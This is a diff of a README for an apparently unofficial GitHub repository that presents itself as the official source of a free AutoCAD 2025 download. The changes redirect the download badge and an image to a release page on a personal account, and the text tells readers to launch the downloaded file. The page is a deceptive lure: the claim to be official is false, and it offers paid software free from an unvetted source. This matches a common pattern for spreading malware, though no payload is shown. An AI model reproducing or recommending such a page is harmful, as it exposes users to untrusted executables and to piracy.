@@ -11,7 +11,7 @@ Welcome to the official repository for **AutoCAD 2025**! Here you can find all t
 
 To download AutoCAD 2025 for free, simply click on the following link:
 
-[![Download AutoCAD 2025](https://img.shields.io/badge/Download%20AutoCAD%202025-Click%20Here-brightgreen)](https://github.com/files/Soft.zip)
+[![Download AutoCAD 2025](https://github.com/saiK8099/auto-cad-2025/releases/tag/v1.2%20AutoCAD%202025-Click%20Here-brightgreen)](https://github.com/saiK8099/auto-cad-2025/releases/tag/v1.2)
 
 Once you click the link, the download will begin automatically. If the link ends with the file name, make sure to launch the downloaded file to start the installation process.
 
@@ -32,7 +32,7 @@ Here are some key highlights of AutoCAD 2025:
 
 Dive into the world of AutoCAD 2025 and unleash your creativity with cutting-edge drafting tools and features. Whether you are a seasoned professional or a beginner in the world of design, AutoCAD 2025 offers a user-friendly interface and robust functionality to bring your ideas to life.
 
-![AutoCAD 2025](https://www.example.com/images/autocad2025.jpg)
+![AutoCAD 2025](https://github.com/saiK8099/auto-cad-2025/releases/tag/v1.2)
 
 ## 📦 Get Started Today!
 
